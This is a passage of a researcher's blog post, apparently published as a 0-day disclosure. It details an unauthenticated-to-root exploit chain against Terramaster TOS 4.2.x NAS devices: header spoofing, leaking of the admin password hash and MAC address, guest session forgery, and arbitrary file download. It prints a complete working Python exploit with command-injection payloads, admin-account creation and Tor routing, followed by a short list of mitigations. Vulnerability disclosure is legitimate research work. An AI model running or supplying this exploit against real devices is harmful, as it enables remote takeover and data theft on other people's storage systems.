+    <span style="color:#6ab825;font-weight:bold">if</span> (<span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">config</span>[<span style="color:#ed9d13">&#39;setting_system&#39;</span>][<span style="color:#ed9d13">&#39;auto_login&#39;</span>] != <span style="color:#ed9d13">&#39;1&#39;</span>) {
+        <span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">logout</span>();
+    } <span style="color:#6ab825;font-weight:bold">else</span> {
+        <span style="color:#6ab825;font-weight:bold">if</span> (!file_exists(USER_SYSTEM . <span style="color:#ed9d13">&#39;install.lock&#39;</span>)) {
+            header(<span style="color:#ed9d13">&#34;location: /Enter.php&#34;</span>);
+            <span style="color:#6ab825;font-weight:bold">exit</span>;
+        }
+        header(<span style="color:#ed9d13">&#39;location:./index.php?user/loginSubmit&amp;name=guest&amp;password=guest&#39;</span>);
+    }
+}
+<span style="color:#999;font-style:italic">/*...*/</span>
+</code></pre></div><h3 id="too-much-info-pal-info-disclosure">Too much info, pal! (Info disclosure)</h3>
+<p>We still miss a little something! We are so close, I can smell the <del>ransomwares creeping upon them</del> victory. The only one missing piece now is the MAC address.</p>
+<p>Luckily this can be easily obtained by either visiting the <code>m1.php</code> and <code>m2.php</code> pages or by contacting the APIs at <code>/module/api.php?mobile/wapNasIPS</code> and <code>/module/api.php?mobile/webNasIPS</code>.</p>
+<p>To correctly contact those we need the following headers to be set:</p>
+<ul>
+<li><code>User-Device:TNAS</code></li>
+<li><code>User-Agent:TNAS</code></li>
+</ul>
+<p>as per <code>include/class/mobile.class.php</code> constructor:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#6ab825;font-weight:bold">function</span> __construct() {
+    <span style="color:#6ab825;font-weight:bold">parent</span>::<span style="color:#bbb">__construct</span>();
+    <span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">start</span> = <span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">mtime</span>();
+
+    <span style="color:#6ab825;font-weight:bold">if</span> (isset(<span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;HTTP_USER_DEVICE&#39;</span>]) &amp;&amp; <span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;HTTP_USER_DEVICE&#39;</span>] == <span style="color:#ed9d13">&#34;TNAS&#34;</span>) <span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;HTTP_USER_AGENT&#39;</span>] = <span style="color:#ed9d13">&#34;TNAS&#34;</span>;
+    <span style="color:#999;font-style:italic">//排除非法请求...
+</span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">if</span> (!in_array(Action, self::<span style="color:#40ffff">$notHeader</span>)) {
+        <span style="color:#6ab825;font-weight:bold">if</span> (!strstr(<span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;HTTP_USER_AGENT&#39;</span>], <span style="color:#ed9d13">&#34;TNAS&#34;</span>) || !isset(<span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;HTTP_AUTHORIZATION&#39;</span>]) || <span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">REQUESTCODE</span> != <span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;HTTP_AUTHORIZATION&#39;</span>]) {
+            <span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">output</span>(<span style="color:#ed9d13">&#34;Illegal request, please use genuine software!&#34;</span>, <span style="color:#6ab825;font-weight:bold">false</span>);
+        }
+    }
+<span style="color:#999;font-style:italic">/*...*/</span>
+</code></pre></div><p>and functions:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">
+<span style="color:#6ab825;font-weight:bold">function</span> <span style="color:#447fcf">webNasIPS</span>() {
+    <span style="color:#6ab825;font-weight:bold">if</span> (strstr(<span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;HTTP_USER_AGENT&#39;</span>], <span style="color:#ed9d13">&#34;TNAS&#34;</span>)) {
+<span style="color:#999;font-style:italic">/*...*/</span>
+
+<span style="color:#6ab825;font-weight:bold">function</span> <span style="color:#447fcf">wapNasIPS</span>() {
+    <span style="color:#6ab825;font-weight:bold">if</span> (<span style="color:#40ffff">$_SERVER</span>[<span style="color:#ed9d13">&#39;HTTP_USER_DEVICE&#39;</span>] == <span style="color:#ed9d13">&#34;TNAS&#34;</span>) {
+<span style="color:#999;font-style:italic">/*...*/</span>
+</code></pre></div><p>Luckily for us, the functions we need to contact are inside the array <code>notHeader</code> which means we do not need the additional <code>HTTP_AUTHORIZATION</code> header for now.</p>
+<p>Setting the headers gets us the info we need, plus a very handy json:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{<span style="color:#6ab825;font-weight:bold">&#34;code&#34;</span>:<span style="color:#6ab825;font-weight:bold">true</span>,<span style="color:#6ab825;font-weight:bold">&#34;sessionid&#34;</span>:<span style="color:#ed9d13">&#34;3902782408ebacea7cda7933c75bfbba&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;msg&#34;</span>:<span style="color:#ed9d13">&#34;wapNasIPS successful&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;data&#34;</span>:{<span style="color:#6ab825;font-weight:bold">&#34;PWD&#34;</span>:<span style="color:#ed9d13">&#34;$1$k2eh7cjZ$rlR5mBvLxrjzQCQQJ/f11/&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;IFC&#34;</span>:<span style="color:#ed9d13">&#34;10.0.0.2&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;ADDR&#34;</span>:<span style="color:#ed9d13">&#34;6cbfb5023f24&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;SAT&#34;</span>:<span style="color:#3677a9">1</span>,<span style="color:#6ab825;font-weight:bold">&#34;DAT&#34;</span>:[{<span style="color:#6ab825;font-weight:bold">&#34;hostname&#34;</span>:<span style="color:#ed9d13">&#34;nas&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;firmware&#34;</span>:<span style="color:#ed9d13">&#34;TOS3_A1.0_4.2.17&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;sn&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;version&#34;</span>:<span style="color:#ed9d13">&#34;2110301418&#34;</span>},{<span style="color:#6ab825;font-weight:bold">&#34;network&#34;</span>:<span style="color:#ed9d13">&#34;eth0&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;ip&#34;</span>:<span style="color:#ed9d13">&#34;10.0.0.100&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;mask&#34;</span>:<span style="color:#ed9d13">&#34;255.255.255.0&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;mac&#34;</span>:<span style="color:#ed9d13">&#34;6c:bf:b5:02:3f:24&#34;</span>},{<span style="color:#6ab825;font-weight:bold">&#34;service&#34;</span>:[{<span style="color:#6ab825;font-weight:bold">&#34;name&#34;</span>:<span style="color:#ed9d13">&#34;http_ssl&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;url&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;port&#34;</span>:<span style="color:#ed9d13">&#34;5443&#34;</span>},{<span style="color:#6ab825;font-weight:bold">&#34;name&#34;</span>:<span style="color:#ed9d13">&#34;http&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;url&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;port&#34;</span>:<span style="color:#ed9d13">&#34;8181&#34;</span>},{<span style="color:#6ab825;font-weight:bold">&#34;name&#34;</span>:<span style="color:#ed9d13">&#34;sys&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;url&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;port&#34;</span>:<span style="color:#ed9d13">&#34;8181&#34;</span>},{<span style="color:#6ab825;font-weight:bold">&#34;name&#34;</span>:<span style="color:#ed9d13">&#34;channel&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;url&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;port&#34;</span>:<span style="color:#3677a9">0</span>},{<span style="color:#6ab825;font-weight:bold">&#34;name&#34;</span>:<span style="color:#ed9d13">&#34;pt&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;url&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;port&#34;</span>:<span style="color:#3677a9">0</span>},{<span style="color:#6ab825;font-weight:bold">&#34;name&#34;</span>:<span style="color:#ed9d13">&#34;ftp&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;url&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;port&#34;</span>:<span style="color:#3677a9">21</span>},{<span style="color:#6ab825;font-weight:bold">&#34;name&#34;</span>:<span style="color:#ed9d13">&#34;web_dav&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;url&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;port&#34;</span>:<span style="color:#3677a9">0</span>},{<span style="color:#6ab825;font-weight:bold">&#34;name&#34;</span>:<span style="color:#ed9d13">&#34;smb&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;url&#34;</span>:<span style="color:#ed9d13">&#34;&#34;</span>,<span style="color:#6ab825;font-weight:bold">&#34;port&#34;</span>:<span style="color:#3677a9">0</span>}]}]},<span style="color:#6ab825;font-weight:bold">&#34;time&#34;</span>:<span style="color:#3677a9">0.2337968349456787</span>}
+</code></pre></div><p>guess who&rsquo;s password hash is in <code>PWD</code>? Correct, the admin&rsquo;s!</p>
+<h3 id="crafting-admins-privilege-escalation">Crafting admins (Privilege escalation)</h3>
+<p>Using the session crafting method explained earlier and the information disclosure discussed above we can easily craft an administrator session.</p>
+<p>During my testing this did not work with the default &ldquo;admin&rdquo; account, this is because if during the setup the user specifies a custom username(in my case n0tme) we are out of luck&hellip; or are we?</p>
+<p>I mean we can brute force the username, but this is lame, considering that it might end up not working, we want a reliable exploit <del>to sell to ZDI</del>.</p>
+<p>This is quickly solvable by looking at the lovely API from <code>/include/class/mobile.class.php</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#6ab825;font-weight:bold">public</span> <span style="color:#6ab825;font-weight:bold">function</span> <span style="color:#447fcf">fileDownload</span>() {
+    <span style="color:#40ffff">$filepath</span> = realpath(<span style="color:#40ffff">$this</span>-&gt;<span style="color:#bbb">in</span>[<span style="color:#ed9d13">&#39;path&#39;</span>]);
+    file_downloading(<span style="color:#40ffff">$filepath</span>);
+}
+</code></pre></div><p>nice, a API which is used for downloading files, I bet you are wondering if we could download a file as a guest user&hellip; yup - that was too easy wasn&rsquo;t it?
+So we can call the <code>fileDownload</code> API then:</p>
+<ul>
+<li>get the <code>/etc/groups</code> file</li>
+<li>find all users in the admin group</li>
+<li>try the hash with each admin until we succeed</li>
+</ul>
+<p>The only extra requirement for the fileDownload API is the <code>signature</code> and <code>timestamp</code> headers which should be set to <code>tos_encrypted_str(timestamp)</code> and the <code>timestamp</code> of the request, respectively. This can be done easily since we have all the pieces.</p>
+<h3 id="chaining">Chaining</h3>
+<p>Now we just have to go over it all, again, in the right order:</p>
+<ol>
+<li>Setup the <code>User-Device</code> and <code>User-Agent</code> to <code>TNAS</code></li>
+<li>Grab the admin hash and MAC address from <code>/module/api.php?mobile/wapNasIPS</code> or <code>/module/api.php?mobile/webNasIPS</code></li>
+<li>Call the <code>fileDownload</code> API to get the <code>/etc/group</code></li>
+<li>Pick one of the 3 RCEs and pwn the NAS.</li>
+</ol>
+<p>Finally, here is the exploit:</p>
+<pre tabindex="0"><code>#/bin/env python
+
+&quot;&quot;&quot;
+Product: Terramaster F4-210, Terramaster F2-210
+Version: TOS 4.2.X (4.2.15-2107141517)
+Author: n0tme (thatsn0tmysite)
+Description: Chain from unauthenticated to root via session crafting.
+&quot;&quot;&quot;
+
+import urllib3
+import requests
+import json
+import argparse
+import hashlib
+import time
+import os
+
+TARGET = None 
+MAC_ADDRESS = None
+PWD = None
+TIMESTAMP = None 
+
+def tos_encrypt_str(toencrypt):
+    key = MAC_ADDRESS[6:] 
+    return hashlib.md5(f&quot;{key}{toencrypt}&quot;.encode(&quot;utf8&quot;)).hexdigest()
+
+def user_session(session, username):
+    session.cookies.clear()
+    cookies = {&quot;kod_name&quot;:username, &quot;kod_token&quot;:tos_encrypt_str(PWD)}
+    if username == &quot;guest&quot;:
+        cookies = {&quot;kod_name&quot;:&quot;guest&quot;, &quot;kod_token&quot;:tos_encrypt_str(&quot;&quot;)}
+    
+    for name,value in cookies.items():
+        session.cookies[name] = value
+
+def download(session, path, save_as=None):
+    user_session(session, &quot;guest&quot;)
+    r=session.post(f&quot;{TARGET}/module/api.php?mobile/fileDownload&quot;, data={&quot;path&quot;:path})
+    filename = os.path.basename(path)
+    if save_as is not None:
+        filename = save_as
+    with open(filename, &quot;wb&quot;) as file:
+        file.write(r.content)
+
+def get_admin_users(session):
+    download(session, &quot;/etc/group&quot;, save_as=&quot;/tmp/terramaster_group&quot;)
+    with open(&quot;/tmp/terramaster_group&quot;, &quot;r&quot;) as groups:
+        for line in groups:
+            line = line.strip()
+            fields = line.split(':')
+            if fields[0] == &quot;admin&quot;:
+                users = fields[3].split(&quot;,&quot;)
+                os.remove(&quot;/tmp/terramaster_group&quot;)
+                return users  
+
+if __name__ == '__main__':
+    p = argparse.ArgumentParser()
+    p.add_argument(dest=&quot;target&quot;, help=&quot;Target URL (e.g. http://10.0.0.100:8181)&quot;)
+    p.add_argument(&quot;--cmd&quot;, dest=&quot;cmd&quot;, help=&quot;Command to run&quot;, default=&quot;id&quot;)
+    p.add_argument(&quot;-d&quot;, &quot;--download&quot;, dest=&quot;download&quot;, help=&quot;Only download file&quot;, default=None)
+    p.add_argument(&quot;-o&quot;, &quot;--output&quot;, dest=&quot;save_as&quot;, help=&quot;Save downloaded file as&quot;, default=None)
+    p.add_argument(&quot;-c&quot;, &quot;--create&quot;, dest=&quot;create&quot;, help=&quot;Only create admin user (format should be admin:password)&quot;, default=None)
+    p.add_argument(&quot;--tor&quot;, dest=&quot;tor&quot;, default=False, action=&quot;store_true&quot;, help=&quot;Use TOR&quot;)
+    p.add_argument(&quot;--rce&quot;, dest=&quot;rce&quot;, default=0, type=int, help=&quot;RCE to use (1 and 2 have no output)&quot;)
+    args = p.parse_args()
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+    TARGET = args.target 
+
+    s = requests.Session()
+    if args.tor:
+        s.proxies = {&quot;http&quot;:&quot;socks5://127.0.0.1:9050&quot;, &quot;https&quot;: &quot;socks5://127.0.0.1:9050&quot;}
+    s.headers.update({&quot;user-device&quot;:&quot;TNAS&quot;, &quot;user-agent&quot;:&quot;TNAS&quot;})
+    
+    r=s.post(f&quot;{TARGET}/module/api.php?mobile/wapNasIPS&quot;)
+    try:
+        j = r.json()
+        PWD = j[&quot;data&quot;][&quot;PWD&quot;]
+        MAC_ADDRESS = j[&quot;data&quot;][&quot;ADDR&quot;]
+    except KeyError:
+        exit(1)
+    
+    TIMESTAMP = str(int(time.time()))
+    s.headers.update({&quot;signature&quot;: tos_encrypt_str(TIMESTAMP), &quot;timestamp&quot;: TIMESTAMP})
+    s.headers.update({&quot;authorization&quot;: PWD})
+
+    if args.download != None:
+        download(s, args.download, save_as=args.save_as)
+        exit(0)
+
+    #RCEs
+    RCEs=[f&quot;{TARGET}/tos/index.php?app/del&amp;id=0&amp;name=;{args.cmd};xx%23&quot;,
+          f&quot;{TARGET}/tos/index.php?app/hand_app&amp;name=;{args.cmd};xx.tpk&quot;, #BLIND
+          f&quot;{TARGET}/tos/index.php?app/app_start_stop&amp;id=ups&amp;start=0&amp;name=donotcare.*.oexe;{args.cmd};xx&quot;] #BLIND
+    
+    for admin in get_admin_users(s):
+        user_session(s, admin)
+        if args.create != None:
+            user, password = args.create.split(&quot;:&quot;) 
+            groups = json.dumps([&quot;allusers&quot;, &quot;admin&quot;])
+            r=s.post(f&quot;{TARGET}/module/api.php?mobile/__construct&quot;)
+            r=s.post(f&quot;{TARGET}/module/api.php?mobile/set_user_information&quot;, data={&quot;groups&quot;:groups, &quot;username&quot;:user,&quot;operation&quot;:&quot;0&quot;,&quot;password&quot;:password,&quot;capacity&quot;:&quot;&quot;})
+            if &quot;create user successful!&quot; in str(r.content, &quot;utf8&quot;):
+                print(r.content)
+                break
+            continue
+
+        r = s.get(RCEs[args.rce])
+        content = str(r.content, &quot;utf-8&quot;)
+        if &quot;&lt;!--user login--&gt;&quot; not in content: 
+            print(content)
+    exit(0)
+</code></pre><h2 id="fix-it">Fix it</h2>
+<p>This should be handled by Terramaster, not yourself, but in case you do not want to wait for them to release a patch.
+Here are a few workarounds, those are to be considered as complementary to each others:</p>
+<ul>
+<li>disconnect your NAS from the internet</li>
+<li>change the guest user&rsquo;s password to a strong one (this prevents the session crafting as guest and file download)</li>
+<li>patch <code>mobile.class.php</code> to not return the hash. Variable should be called <code>PWD</code>, just set it to &quot;&quot; or something.</li>
+<li>remove the <code>m1.php</code> and <code>m2.php</code> files, not even sure what they are needed for&hellip; (to avoid leaking the MAC address)</li>
+<li>patch as soon as this gets fixed by terramaster.</li>
+</ul>
+<p>As for the RCEs for authorized users a deeper look at the architecture of the application is required and I do not work for Terramaster, so I leave that up to them.</p>
+<h2 id="conclusions">Conclusions</h2>
+<p>I hope this will push Terramaster to step in and quickly fix this issue ASAP.
+Now, I guess it&rsquo;s time to watch some <del>leaked Matrix</del> some XMAS movie&hellip; Die Hard.</p>
+<p>Have fun and listen to more <a href="https://www.youtube.com/watch?v=D8K90hX4PrE">Daft Punk</a>.</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="/tags/4/">4</a></span>
+        <span class="tag"><a href="/tags/terramaster/">terramaster</a></span>
+        <span class="tag"><a href="/tags/0day/">0day</a></span>
+        <span class="tag"><a href="/tags/chain/">chain</a></span>
+        <span class="tag"><a href="/tags/vulnerability/">vulnerability</a></span>
+        <span class="tag"><a href="/tags/rce/">RCE</a></span>
+        <span class="tag"><a href="/tags/exploit/">exploit</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        2919 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2021-12-24 21:48
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=%2fposts%2f2021%2f12%2fhow-to-summon-rces%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=%2fposts%2f2021%2f12%2fhow-to-summon-rces%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=How%20to%20summon%20RCEs&amp;caption=How%20to%20summon%20RCEs&amp;canonicalUrl=%2fposts%2f2021%2f12%2fhow-to-summon-rces%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=How%20to%20summon%20RCEs&amp;body=%2fposts%2f2021%2f12%2fhow-to-summon-rces%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=%2fposts%2f2021%2f12%2fhow-to-summon-rces%2f&amp;media=%2fposts%2f2021%2f12%2fhow-to-summon-rces%2f;description=How%20to%20summon%20RCEs" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=%2fposts%2f2021%2f12%2fhow-to-summon-rces%2f&amp;title=How%20to%20summon%20RCEs&amp;summary=How%20to%20summon%20RCEs&amp;source=%2fposts%2f2021%2f12%2fhow-to-summon-rces%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=%2fposts%2f2021%2f12%2fhow-to-summon-rces%2f&amp;resubmit=true&amp;title=How%20to%20summon%20RCEs" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=%2fposts%2f2021%2f12%2fhow-to-summon-rces%2f;title=How%20to%20summon%20RCEs" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
